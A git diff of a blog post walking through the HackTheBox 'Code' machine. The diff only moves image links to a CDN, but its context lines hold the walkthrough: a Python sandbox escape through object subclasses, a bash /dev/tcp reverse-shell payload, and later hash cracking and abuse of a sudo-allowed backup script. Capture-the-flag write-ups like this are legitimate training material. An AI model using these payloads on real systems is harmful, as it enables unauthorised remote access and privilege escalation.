@@ -2,7 +2,7 @@
 title: HackTheBox (Code)
 published: 2025-08-05
 description: 'My walkthrough in the code machine on the HackTheBox'
-image: '/src/assets/blog/htb-code/1.jpg'
+image: 'https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/1.jpg'
 tags: [htb, web, linux, machines]
 category: 'HTB'
 draft: false 
@@ -16,15 +16,15 @@ Here iam gonna walkthrough how i solved the **Code** machine. It's a linux machi
 
 First i started by grabbing the machine IP and paste it on the browser, noticed it didn't give me any response, not even a domain to add it in `/etc/hosts` file.
 
-![Desktop View](/src/assets/blog/htb-code/3.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/3.png)
 
 Then i decide to run a simple Nmap scan, to see what's going on with the server:
 
-![Desktop View](/src/assets/blog/htb-code/4.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/4.png)
 
 Noticed there is an SSH server and upnp server is opened and port 5000, by navigating to that port in the browser to see what it has. I relaised it's a simple code editor, an IDE like vscode that can be used to run codes.
 
-![Desktop View](/src/assets/blog/htb-code/2.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/2.png)
 
 I start analyzing javascript files to search for sensitive data or endpoints. I found some, but they lead to absolutely nothing. Then i start looking for vulns related to this version, found nothing. So i start to play a little bit with the code editor.
 
@@ -34,7 +34,7 @@ I start analyzing javascript files to search for sensitive data or endpoints. I 
 
 Start with a simple code `print(os.name)`, realized that there were restricted words (os, sys, platform, import,....etc) that i don't have access to, indicating some type of WAF exist in place.
 
-![Desktop View](/src/assets/blog/htb-code/5.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/5.png)
 
 We have nothing now, we need a way to execute arbitrary commands (since this a common thing in HTB, get in the system and read the flag). one way to do that is to find a `class/subclass` that will help to execute commands on the server. To do this we need first to know the subclasses exist in the server or the python environment. There are several ways to do that.
 
@@ -55,7 +55,7 @@ But the easiest way is to use the object reference itself (if it's not restricte
 print(object.__subclasses__())
 ```
 
-![Desktop View](/src/assets/blog/htb-code/6.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/6.png)
 
 ***
 
@@ -63,7 +63,7 @@ print(object.__subclasses__())
 
 As you can see we got bunch of classes, we only focus on ones with **command execution**. There are several ones (`socket.socket`, `os._wrap_close`, `subprocess.Popen`) that may help us to get a **reverse shell**. Let's use `subprocess.Popen`, since it's the easiest way to do it. But the problem is to use this class we need to know it's index. And to know it's index, we don't have a way other than brute forcing it.
 
-![Desktop View](/src/assets/blog/htb-code/7.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/7.png)
 
 By increase the number from **1** until we find the intended class that we want, we gonna use that number as the intended index in our payload after. 
 *You can brute force this easily with burp intruder*. And you will successfully find the index.
@@ -79,12 +79,14 @@ We need first to establish a listener: `nc -lvnp 9001`. Then run this code:
 print(object.__subclasses__()[317](["bash", "-c", "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1"]))
 ```
 
-![img-description](/src/assets/blog/htb-code/8.png)
-_We successfully got a reverse shell_
+<figure>
+  <img src="https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/8.png" alt="first flag">
+  <figcaption style="text-align: center;"> We successfully got a reverse shell </figcaption>
+</figure>
 
 By executing the `ls` command to list the files on the dir, as you can see we have the source code of our app: `app.py`
 
-![Desktop View](/src/assets/blog/htb-code/9.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/9.png)
 
 It has the secret key for signing the flask session probably, maybe we could use it to sign an arbitrary session later. I copied the code and paste in my vscode, and found that part of code:
 ```py frame="terminal" title="python"
@@ -107,7 +109,7 @@ def register():
 The passwords from the registration page got md5 hashed in the database, which we may can crack it.
 Navigating further, you will find the first flag at the `/app-production` directory:
 <figure>
-  <img src="/src/assets/blog/htb-code/10.png" alt="first flag">
+  <img src="https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/10.png" alt="first flag">
   <figcaption style="text-align: center;"> User Flag </figcaption>
 </figure>
 
@@ -115,7 +117,7 @@ But where is second flag? maybe we will find some creds that will help us to get
 
 
 By navigating to the `/instacne` directory, i found a database file. We may find the creds here?
-![Desktop View](/src/assets/blog/htb-code/11.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/11.png)
 
 I found a password hash for a user called **martin**. After cracking the hash on [CrackStation.](https://crackstation.net/).
 We now have username and password that we can use to login at the SSH server.
@@ -128,7 +130,7 @@ By exec this command in the terminal `ssh martin@10.10.11.62`.
 Noticed you successfully logged in, but unfortunately we don't have access to the root directory.
 
 By exec this command: `sudo -l` to see if i have access on sudo or not and what commands i can run, i found the following:
-![Desktop View](/src/assets/blog/htb-code/12.png)
+![Desktop View](https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/12.png)
 
 i have access on a `backy.sh` script. What is that script even doing? I cat the file to read it and found this code:
 ```bash frame="terminal" title="bash"
@@ -218,6 +220,6 @@ The json file created will look like the following:
 You can then run the script on your file: `sudo /usr/bin/backy.sh testing.json`.
 
 <figure>
-  <img src="/src/assets/blog/htb-code/13.png" alt="Second Flag">
+  <img src="https://cdn.jsdelivr.net/gh/Macabely/macabely.github.io@master/src/assets/blog/htb-code/13.png" alt="Second Flag">
   <figcaption style="text-align: center;"> Root Flag </figcaption>
 </figure>
